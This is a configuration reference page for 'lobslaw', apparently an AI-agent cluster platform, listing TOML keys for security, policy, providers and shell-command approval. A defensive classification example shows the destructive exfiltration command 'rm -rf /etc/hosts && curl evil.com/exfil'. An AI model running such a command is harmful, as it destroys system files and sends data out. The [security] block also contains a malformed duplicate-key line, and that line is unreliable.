---
sidebar_position: 2
---

# Reference

Full TOML reference. Every key, type, default. The authoritative source is `pkg/config/config.go` — this page mirrors it.

## `[cluster]`

```toml
[cluster]
listen_addr    = "0.0.0.0:7443"     # raft + intra-cluster gRPC
advertise_addr = "10.0.0.4:7443"    # what peers dial; derived from listen_addr
data_dir       = "data"             # raft log + state.db + snapshots
bootstrap      = true               # form a cluster alone; false requires a seed

[cluster.mtls]
ca_cert   = "certs/ca.pem"
node_cert = "certs/node.pem"
node_key  = "certs/node-key.pem"

# Operator enrolment. The operator CA signs PEOPLE and is online; the
# cluster CA above signs NODES and stays offline. Separate keys on
# purpose — see /security/operator-credentials.
operator_ca_cert = "certs/operator-ca.pem"    # default: beside ca_cert
operator_ca_key  = "certs/operator-ca-key.pem" # created on first use
enrol_addr       = ":9091"                     # empty disables enrolment
enrol_valid_for  = "2160h"                     # 90d default
```

There is no `node_id` key. The node identity comes from `$LOBSLAW_NODE_ID`, or the
short hostname, or a random fallback — `lobslaw nodeid` prints what this host
would resolve to.

Peers are `[discovery] seed_nodes`, and the gateway port is `[gateway] http_port`.

`enrol_addr` is a **separate listener** that requires no client certificate,
because a laptop enrolling does not have one yet. It serves only the submit and
poll RPCs. Leaving it empty disables new enrolments; credentials already issued
keep working.

## `[memory]`

```toml
[memory]
data_dir = "data"

[memory.encryption]
key_ref = "env:LOBSLAW_MEMORY_KEY"   # base64 32-byte key

[memory.snapshot]
# Boot validation only today: a memory node with neither a snapshot
# target nor seed nodes is a single point of loss. Shipping is not
# implemented, so there is no schedule or retention to configure.
target = "local"
```

## `[storage]`

```toml
[storage]
enabled = true

[[storage.mounts]]
label = "workspace"
type  = "local"
path  = "/workspace"
mode  = "rw"

[[storage.mounts]]
label = "skill-tools"
type  = "local"
path  = "/var/lib/lobslaw/skills"
mode  = "ro"
```

## `[security]`

```toml
[security]
egress_upstream_proxy        = ""
egress_allow_private_ranges  = false
egress_allow_ranges          = []
egress_uds_path              = ""             # required for netns skills
clawhub_base_url             = ""             # set to enable clawhub_install
clawhub_binary_hosts         = []             # default github.com release hosts
clawhub_install_mount        = "skill-tools"
# Skill signing policy lives in [skills], not here.
clawhub_base_url             = "https://clawhub.dev" | require
fetch_url_allow_hosts        = []             # empty = permissive

# Per-provider OAuth configuration
[security.oauth.google]
client_id_ref     = "env:GOOGLE_OAUTH_CLIENT_ID"
client_secret_ref = "env:GOOGLE_OAUTH_CLIENT_SECRET"
# device_auth_endpoint, token_endpoint, userinfo_endpoint default to provider standard

[security.oauth.github]
client_id_ref     = "env:GITHUB_OAUTH_CLIENT_ID"
client_secret_ref = "env:GITHUB_OAUTH_CLIENT_SECRET"
```

## `[policy]` + `[[policy.rules]]`

```toml
[policy]
enabled               = true
unknown_user_scope    = "public"      # NEVER set to anything else for prod

[[policy.rules]]
id          = "owner-soul-tools"
description = "Owner can mutate soul"
priority    = 20
effect      = "allow"
subject     = "scope:owner"
action      = "tool:exec"
resource    = "soul_*"
```

See [policy rules](/configuration/policy-rules) for matching semantics.

## `[[remote]]`

```toml
# Hosts remote_ssh may reach. The agent names one; it cannot supply a
# host, port, user or key. Requires remote_ssh to be enabled — see
# compute.disabled_tools below. Full page: /configuration/remotes
[[remote]]
name        = "go"
description = "Go toolchain, opencode, aide"   # reaches the model; how it chooses
host        = "devbox-go.lobslaw-dev.svc.cluster.local"
port        = 2222                              # default 2222, not 22
user        = "dev"                             # default "dev"
key_ref     = "file:/etc/lobslaw/remote/id_ed25519"
known_hosts = "/var/lobslaw/data/remote_known_hosts"  # written as well as read
default_timeout_secs = 300                      # builds are slow
max_timeout_secs     = 3600
```

`known_hosts` is trust-on-first-use: an unknown host is recorded, a host whose key *changed* is refused. Empty disables persistence, never verification.

## `[compute]`

```toml
[compute]
default_chain = "main"

# Glob patterns matched against tool NAMES. A match is never
# registered, so the agent never sees the tool. Absent takes the
# default below; `[]` means nothing is disabled. The two are NOT the
# same — see /reference/builtin-tools#disabling-tools.
disabled_tools = ["remote_*"]

# What runs WITHOUT being asked about, as a set of labels. Approval is
# a SUBSET CHECK: every label a command carries must be in this set.
#
# Labels: reads, writes, deletes, disrupts, network, privilege.
# "unreadable" cannot be approved by any spelling — a command nobody
# could read is the case the gate exists for.
#
# A preset, or an explicit list:
#   "strict"                        approves nothing
#   "standard"                      approves reads          (the default)
#   "trusted"                       approves reads, writes
#   ["reads", "writes", "deletes"]  say exactly what you mean
#
# The list form expresses things no ranked tier could: an approved set
# no longer has to be a prefix of some ordering, so you can approve
# deletion without also approving egress.
#
# No mode reaches the hardline floor. Run
#     lobslaw policy classify '<command>'
# to see how any command is read, and what each preset does with it.
approval_mode = "standard"

# Default deadline for every [compute.roles] entry that sets none of
# its own. Unset leaves each call site on its own compiled-in default,
# which differs by purpose — a routing hint and a full transcript
# replay are not the same wait, and one number for both is worse than
# two good ones.
model_timeout = "60s"

[[compute.providers]]
label              = "openrouter"
driver             = "openai"         # openai (default) | anthropic | mock
endpoint           = "https://openrouter.ai/api/v1/chat/completions"
api_key_ref        = "env:OPENROUTER_API_KEY"
model              = "anthropic/claude-sonnet-4"
trust_tier         = "public"         # public | private | local, or 1-100 (higher = more trusted)
capabilities       = ["chat"]
auto_capabilities  = true             # opt-in to models.dev capability discovery
backup             = "openrouter-fallback"

# `driver` names the WIRE PROTOCOL, not the vendor. Qwen Cloud, Groq,
# Together, Fireworks and a local Ollama are all `driver = "openai"`
# with different endpoints — which is why the driver list stays short
# while the provider list does not. Omitting it means "openai".
#
# Use `driver = "anthropic"` to talk to the Messages API directly
# rather than through an OpenAI-compatible relay. It sends x-api-key
# rather than a bearer token; api_key_ref is unchanged.
[[compute.providers]]
label       = "claude-direct"
driver      = "anthropic"
model       = "claude-sonnet-4-6"
api_key_ref = "env:ANTHROPIC_API_KEY"
trust_tier  = "private"
capabilities = ["chat"]

# `driver = "mock"` answers without touching the network. For a node
# that must boot and serve turns offline — CI, a smoke test, or
# reproducing a bug without spending tokens.
[[compute.providers]]
label      = "offline"
driver     = "mock"
model      = "mock-main"
trust_tier = "local"

[compute.embeddings]
# type selects where embeddings come from:
#   "remote"  (default) an HTTP endpoint
#   "builtin"           a model this node runs in-process
type        = "remote"
endpoint    = "https://openrouter.ai/api/v1/embeddings"
api_key_ref = "env:OPENROUTER_API_KEY"
model       = "openai/text-embedding-3-small"
dims        = 1536
# format picks the request/response protocol: "openai" (the default,
# and what most vendors speak) or "minimax". Auto-detection is
# deliberately NOT supported — probing on first call wastes tokens and
# fails silently when credentials are wrong.
format      = "openai"
# Prefixes for models trained ASYMMETRICALLY, prepended before
# embedding. The e5 family wants these; leave them unset for anything
# symmetric, including the recommended all-MiniLM-L6-v2, where
# prefixing makes retrieval worse rather than better.
# query_prefix   = "query: "
# passage_prefix = "passage: "

# The builtin form instead. No endpoint, no API key, and no egress at
# query time: memory content never leaves the node. Note that
# embeddings are computed for EVERY record, including private ones, so
# a remote embedder is a standing disclosure of the whole corpus.
#
# model is a directory name under <data_dir>/models, and is also the
# identity stamped on every vector — changing it is refused at boot
# until the corpus is re-embedded.
#
# download_url is the base of an HTTP directory holding config.json,
# model.safetensors and tokenizer.json. For a HuggingFace repo that is
#   https://huggingface.co/<org>/<repo>/resolve/main
#
# There is NO DEFAULT. Empty means nothing is fetched and a missing
# model is an error at boot, which is what an air-gapped node needs;
# downloading has to be asked for. The host is also granted egress
# under the "embedding-model" role only when this is set.
#
# That role covers the host in the URL plus the CDNs it is known to
# redirect to — HuggingFace serves weights from *.hf.co, GitHub from
# the release-asset hosts. A mirror that redirects anywhere else is
# refused by the egress proxy: the node fails at boot saying so, and
# the fix is to allow that host or to place the checkpoint under
# <data_dir>/models/<model> yourself and leave download_url empty.
#
# dims is optional here and CHECKED against the checkpoint rather than
# trusted — a mismatch fails at boot instead of writing a corpus at the
# wrong width.
#
# [compute.embeddings]
# type         = "builtin"
# model        = "multilingual-e5-base"
# download_url = "https://huggingface.co/intfloat/multilingual-e5-base/resolve/main"

[compute.roles]
# main, preflight, reranker, summariser, command_risk. There is no
# "worker" or "council" role.
main = "openrouter"

# The model asked what a shell command does when the static classifier
# cannot read it — a loop, a substitution, a variable in the command
# slot. It answers a closed enum and nothing else, and no prose from it
# ever reaches a confirmation prompt.
#
# UNSET MEANS NO MODEL IS ASKED. There is deliberately no fallback to
# main: this runs on every unreadable command, which is not a bill
# anybody has budgeted for unless they said so. Worth the strongest
# model you will pay for — its verdict is what consent is given
# against. See /security/policy-engine.
# command_risk = "big-model"

# Where secret references other than env: and file: resolve from. A
# provider's label IS the reference scheme, so "bw:app/key" works
# anywhere "env:APP_KEY" does. See /configuration/secrets.
[[secrets.providers]]
label  = "bw"
driver = "bitwarden"                          # or onepassword, or exec
env        = { BW_CONFIG_DIR = "/etc/lobslaw/bw" }  # plaintext
secret_env = { BW_SESSION = "env:BW_SESSION" }      # refs; the vault's own credential stays on env:/file:

[[secrets.providers]]
label   = "pass"
driver  = "exec"
command = ["pass", "show", "{{path}}"]

[compute.web_search]
# Ordered failover chain, naming [[compute.search_providers]] labels.
# `provider = "searxng"` is sugar for a one-element list.
providers = ["searxng", "exa"]

[[compute.search_providers]]
label      = "searxng"
driver     = "searxng"
endpoint   = "http://searxng:8080/search"
trust_tier = "local"
options    = { language = "en", safesearch = "1" }

[[compute.search_providers]]
label       = "exa"
driver      = "exa"
api_key_ref = "env:EXA_API_KEY"
trust_tier  = "public"

# driver = "template" describes an engine entirely in TOML — no Go, no
# rebuild. See [Web search](/features/web-search) for worked examples.
[[compute.search_providers]]
label        = "brave"
driver       = "template"
endpoint     = "https://api.search.brave.com/res/v1/web/search"
api_key_ref  = "env:BRAVE_API_KEY"
trust_tier   = "public"
options      = { query_param = "q", count_param = "count", auth_style = "header", auth_name = "X-Subscription-Token" }
response     = { results = "web.results", snippet = "description", published_at = "page_age" }

[compute.limits]
max_tool_calls_per_turn = 25

[compute.context]
# How much prior conversation each turn replays, and how the rest is
# compacted. Every value is optional; the defaults shown are applied
# when the key is absent. An explicit 0 DISABLES a bound rather than
# taking the default.
tail_tokens                   = 4000   # verbatim history budget per turn
history_tool_result_bytes     = 512    # truncate REPLAYED tool results
compact_enabled               = true   # false disables compaction
compact_keep_messages         = 40     # never summarise the recent exchange
compact_trigger_tokens        = 1500   # aged-out volume that justifies a call
compact_max_summary_tokens    = 600    # cap on the stored summary
compact_tool_result_bytes     = 400    # tool output the summariser reads
# Appended to the built-in summariser prompt, not replacing it.
compact_instructions = "Always keep ticket numbers and schema decisions."

# Conversation titles, generated once on first compaction.
titles_enabled = true

# `tail_messages`, `compact_max_completion_tokens` and
# `title_max_chars` used to be here. The first two were second caps on
# things another setting already capped, and the tighter of two caps
# wins silently — a `tail_messages` of 5 beside a generous
# `tail_tokens` truncated history for a reason nobody could see in the
# config. They are derived now, so the pair cannot disagree.
# `title_max_chars` was a UI constant: a title's length does not vary
# by deployment.

# Bounds on what the session_* tools may pull into the agent's
# context. Unbounded, one session_read undoes the context budget in a
# single tool call.
session_search_results  = 5
session_search_snippets = 3
session_read_messages   = 40
```

**Sizing them.** `tail_tokens` is the one to move first: it sets what a turn
costs. `compact_max_summary_tokens` must stay well below it — the summary is
prepended to every turn, and config validation rejects a summary budget larger
than the verbatim budget it is meant to make room for.

`compact_trigger_tokens` trades LLM calls against context freshness: lower means
more frequent, smaller summarisation calls; higher means aged-out messages sit
un-summarised for longer and may be dropped by `tail_tokens` before they are
ever folded in.

Compaction needs a summariser: set `[compute.roles].summariser` to a cheap model
so compaction doesn't run on your expensive one. With no summariser resolved,
compaction is off and long conversations simply lose their oldest messages.

### Classifying what a command does

```toml
[compute.shell_approval]
# Absolute roots under which deleting something is a write rather than
# a loss, so `rm /tmp/probe` and `rm -rf /etc` are not filed as the
# same act. Empty takes /tmp and /var/tmp; nothing else is assumed.
# Relative entries are dropped.
scratch_paths = ["/tmp", "/var/tmp", "/workspace"]

# How far the [compute.roles] command_risk model may move a tier:
#   advisory        — it may only RAISE one (the default).
#   resolve_unknown — it may also resolve "unknown" down to a concrete
#                     tier, and only unknown.
verdict_trust = "advisory"

# Extend the shipped classification table. MERGED over it, not
# replacing it — the opposite contract to command_classes. An empty
# entry removes a shipped one.
#
# Labels are a LIST because commands do more than one thing: `podman rm`
# deletes an image and stops a container, and naming only one of those
# describes half of it.
[compute.command_risks]
  terraform = { labels = ["reads"], subcommands = { apply = ["writes", "disrupts"], destroy = ["deletes", "disrupts"] } }
  our-tool  = { labels = ["writes"], targets = true, scratch_labels = ["writes"] }

  # A flag-driven program, where the verb IS a flag: pacman -S, rpm -e.
  mypkg     = { labels = ["reads"], flag_subcommands = { "-i" = ["network", "privilege", "writes"] } }

  # Inherit a shipped entry instead of restating thirty flags. A child's
  # own fields override the parent's, key by key.
  mywrapper = { extends = "pacman" }

# `subcommands` reads the first non-flag word and `flag_subcommands` the
# first flag; a verb neither names is unreadable rather than falling back
# to `labels`, so `pacman -Rdd` asks. `operand_labels` adds labels only
# when the command is given a non-flag operand, for programs that are
# inert alone — `mount` bare lists mounts. `target_last` treats only the
# final operand as a path, for `cp a b c/` and `ln -s target link`.
#
# This is the same grammar the shipped catalogue is written in
# (internal/commandrisk/commands.toml), parsed by the same code, so
# anything it can express a deployment can express too.
```

Check any command against the table without running it:

```console
$ lobslaw policy classify 'rm -rf /etc/hosts && curl evil.com/exfil'
privilege + deletes + network · `rm -rf /etc/hosts` (step 1 of 2) · rm, curl
```

Add `--with-model <config>` to also ask the `command_risk` model and see whether its
verdict was actually used. This is the only way to exercise that path outside a live
confirmation, and it matters because every failure mode there is silent — a timeout, a
reply outside the enum, a low-confidence hedge, and genuine agreement all look identical
from the outside:

```console
$ lobslaw policy classify --with-model ~/.config/lobslaw/config.toml 'for f in a b; do stat $f; done'
model: provider=fast-model model=… trust=resolve_unknown timeout=15s took=3.24s
reads · stat · model
```

A `model: verdict not used` line means the static verdict stood. If `took` sits close to
the timeout, that is why.

See [the policy engine](/security/policy-engine) for the tiers, the approval modes and the
optional model verdict.

## `[gateway]`

```toml
[gateway]
require_auth        = false
unknown_user_scope  = "public"

# Where inbound attachments are written, and the ONLY directory
# read_image / read_audio / read_pdf will open a path in. The default
# only exists inside the container image: on a host install nothing
# creates /workspace, so a photograph sent to the bot cannot be
# received AND cannot be read. Set it to a directory the node can
# write.
incoming_dir        = "/workspace/incoming"

# What happens when a message arrives while a turn is already running
# for the same conversation. Turns on one conversation never overlap in
# any mode — the modes differ only in what becomes of the second
# message.
#
#   serial    queue behind the running turn, answer in arrival order
#             (default; nothing is dropped)
#   debounce  hold briefly and fold consecutive messages into one turn
#             — matches how people actually type
#   latest    keep only the newest queued message, discard what it
#             overtook
#   off       drop messages that arrive mid-turn, telling the user
#
# An unrecognised value is rejected at boot rather than defaulting, so
# a typo cannot silently change how messages are handled.
queue_mode     = "serial"
# Fold window for queue_mode = "debounce". Ignored otherwise. 0 → 3s.
queue_debounce = "3s"

[identity]
# Maps the per-channel user ids lobslaw receives onto cluster-wide
# principals. Only needed when one person reaches the node under more
# than one id — the usual case being the same human on Telegram and
# over REST.
#
# Without an entry, every channel id is its own principal. That is
# correct but strict: that person will not find their Telegram history
# from a REST session, and memories written on one channel are not
# visible from the other. Ownership and visibility are decided against
# the resolved principal, so this is also what decides whose memories
# passive recall may inject into a turn.
#
# Values are bare ids; lobslaw prefixes the principal kind itself.
# Keys match case-insensitively.
[identity.aliases]
# "tg-@alice"         = "alice"
# "alice@example.com" = "alice"

[memory.session]
# TTL after which a retention=session record becomes a prune candidate.
# Episodic turn ingest writes at this retention, so this is how long a
# conversation stays semantically searchable before Dream has to have
# consolidated anything worth keeping. Empty/zero → 24h.
max_age  = "24h"
# Cron for the auto-seeded prune task. Empty → "@hourly". The prune
# itself is cheap: a linear bucket scan plus one raft.Apply per stale
# record.
schedule = "@hourly"

# Conversation storage. session_max_messages is a STORAGE bound — it
# sets what is kept on disk for search and export, not what is sent to
# the model (that is [compute.context]).
session_max_messages  = 200
# The in-memory buffer that fronts the durable store. It is the
# degraded mode for turns handled on a raft follower, since session
# writes are leader-only — not a performance cache.
session_cache_messages = 100
session_cache_ttl      = "30m"

[[gateway.channels]]
type      = "telegram"
bot_token_ref = "env:TELEGRAM_BOT_TOKEN"

[gateway.channels.user_scopes]
"123456789" = "owner"        # chat_id → scope override

[[gateway.channels]]
# The REST listener is [gateway] http_port; a channel has no listen
# address of its own.
type      = "rest"
```

## `[mcp.servers.<name>]`

Two shapes, and a server is one or the other. `command` spawns a
subprocess and talks to it over stdio; `url` reaches a server someone
else is running, over MCP's HTTP+SSE binding. Declaring both is
refused at start.

**Remote (SSE):**

```toml
[mcp.servers.kitchenowl]
url = "https://kitchen.example.net/mcp/sse"
bearer_token = "env:KITCHENOWL_TOKEN"
```

**Local (stdio):**

```toml
[mcp.servers.minimax]
command  = "uvx"
args     = ["minimax-mcp-server"]
env      = { MINIMAX_API_KEY = "ref:env:MINIMAX_API_KEY" }
networks = ["api.minimax.chat"]
```

| Field | Shape | Meaning |
|---|---|---|
| `url` | remote | SSE endpoint. Its host **is** the egress allowlist |
| `bearer_token` | remote | Secret ref → `Authorization: Bearer <value>`. The usual case |
| `headers` / `secret_headers` | remote | Everything else, verbatim. Sent on the stream *and* every POST |
| `command` / `args` | stdio | The subprocess to spawn |
| `env` / `secret_env` | stdio | Its environment |
| `networks` | stdio | Hosts the subprocess may reach. **Empty means none** |
| `install` | stdio | Runs once before spawning; pin the version — this is the supply-chain boundary |
| `disabled` | both | Declared but not started |

### Egress is pinned, both ways

Every server gets egress role `mcp/<name>`, and the two shapes enforce
it differently:

- **Remote** — lobslaw makes the HTTP call itself through that role, so
  the allowlist is enforced in-process and the server cannot opt out.
- **Stdio** — the subprocess is handed `HTTPS_PROXY` pointing at the
  proxy. That is a hint a subprocess may ignore, so a stdio server is
  the *less* confined of the two.

A stdio server with no `networks` reaches nothing. That is deliberate:
an omission should show up as a denial rather than as unbounded
access.

**A self-hosted server on your LAN needs one more setting.** Smokescreen
refuses RFC1918 destinations whatever the hostname allowlist says, so
`https://kitchen.local/sse` also needs its range in
`security.egress_allow_ranges`. Without it the failure is a proxy
rejection naming neither the range nor the setting that fixes it.

## `[scheduler]`

```toml
```

## `[skills]`

```toml
[skills]
signing_policy = "prefer"
```

## `[soul]`

```toml
[soul]
path = "SOUL.md"
```

## `[audit.local]`

```toml
[audit.local]
path = "audit/audit-{date}.jsonl"
mode = 0640
```

## `[[user]]`

One entry per human the deployment knows about. Seeded into the
user-preferences bucket on first boot; runtime edits win on subsequent
boots, so this is the initial declaration rather than a live mirror.

```toml
[[user]]
id           = "alice"
display_name = "Alice"
timezone     = "Europe/London"
language     = "en"
roles        = ["operator"]

[[user.channels]]
type    = "telegram"
address = "123456789"
```

`id` is the canonical principal id — the same value `[identity.aliases]`
maps channel ids onto. Everything else is keyed off it.

### `roles`

Policy subjects this person holds, matched by rules written as
`subject = "role:operator"`. A JWT's `roles` claim does the same job for
REST callers; this key is how a channel with no token — Telegram — says
the same thing.

Roles are looked up by resolved principal, so `roles` on `id = "alice"`
covers every channel id `[identity.aliases]` maps to `alice`. A channel
id with no alias entry resolves to itself and therefore matches no
`[[user]]` block, which means an operator arriving on a second channel
needs an alias entry before their role follows them there.

**Holding a role grants nothing on its own.** It only makes the
principal matchable by a rule. Cross-owner memory access in particular
is a policy decision, not a property of the role:

```toml
[[policy.rules]]
id       = "operators-read-any-memory"
subject  = "role:operator"
action   = "memory:read:any"
resource = "memory:*"
effect   = "allow"
priority = 50
```

Nothing seeds that rule. Without it, a `role:operator` principal reads
exactly what they own, the same as anyone else. With it, every widened
read — `memory_search`, passive recall, a cross-owner `memory_forget` —
appends an entry to the audit chain naming the principal and the rule
that allowed it.

`effect = "deny"` and `effect = "require_confirmation"` both refuse the
widening. Confirmation is not offered: two of the three call sites run
with no user in front of them to ask, and an effect chosen to slow
something down must not become the one that speeds it up.

## `[debug]`

Diagnostics that stay off unless asked for.

```toml
[debug]
# Start a pprof server. Unset (the default) starts nothing.
pprof_addr = "127.0.0.1:6060"

# Contention profiling, off by default. Both cost time on every blocking
# operation, so turn them on while investigating and off afterwards.
block_profile_rate    = 10000  # ns of blocked time per sample; 1 records everything
mutex_profile_fraction = 100   # report 1/n contention events; 1 records everything
```

`block` and `mutex` are the profiles worth opening a profiler for on a node
running raft, a gateway and a dozen background loops — and they are the two the
runtime keeps switched off. Left off, `/debug/pprof/block` returns a well-formed
**empty** profile rather than an error, which reads as "no contention" instead
of "not recording". A goroutine dump shows what is blocked; these show what is
blocking it.

pprof has **no authentication**, and its dumps are not innocuous: a heap or
goroutine profile of this process can contain decrypted memory, tokens in
flight, and prompt text. Treat the address as granting read access to
everything the node knows.

Bind loopback wherever loopback is reachable. A container is the case where it
is not — the host cannot reach the container's loopback — so profiling one
means `0.0.0.0:6060` with the port published only to the host. That is allowed
and logged as a warning every time it starts.

`LOBSLAW_PPROF_ADDR` overrides the setting, for attaching to a node that is
already misbehaving without editing its config and restarting it.

```console
$ curl -s http://127.0.0.1:6060/debug/pprof/goroutine?debug=2   # dump goroutines
$ go tool pprof http://127.0.0.1:6060/debug/pprof/heap          # heap profile
$ curl -s http://127.0.0.1:6060/debug/pprof/goroutineleak?debug=1  # leaked goroutines
```

The last one is Go 1.27's leak profile: goroutines blocked on a primitive that
can no longer be unblocked, found by the garbage collector's reachability
analysis. Nothing registers it here — `pprof.Index` looks profiles up when the
request arrives, so profiles a newer Go adds appear on their own.

## Other sections

`[discovery]`, `[observability]`, `[hooks]` — see `pkg/config/config.go` for the full schema. These are stable but rarely-touched.

## Secret references

Anywhere the schema says `*_ref`:

```
"env:NAME"          # read from environment
"file:/path"        # read from a file (chmod 0600 strongly recommended)
"vault:secret/..."  # planned; not wired yet
"literal:foo"       # inline (testing only — do not use in prod)
```

## Hot reload

`SIGHUP` reloads `config.toml`:

- Policy rules — applied to next tool call
- Egress ACL — applied to next CONNECT
- mTLS certs — atomic swap, in-flight handshakes unaffected
- Provider list — applied to next LLM call
- Channels — channel-specific; Telegram restart its long-poll, REST closes its listener and re-binds

Anything else (raft listen address, mount paths, encryption key) requires a process restart.
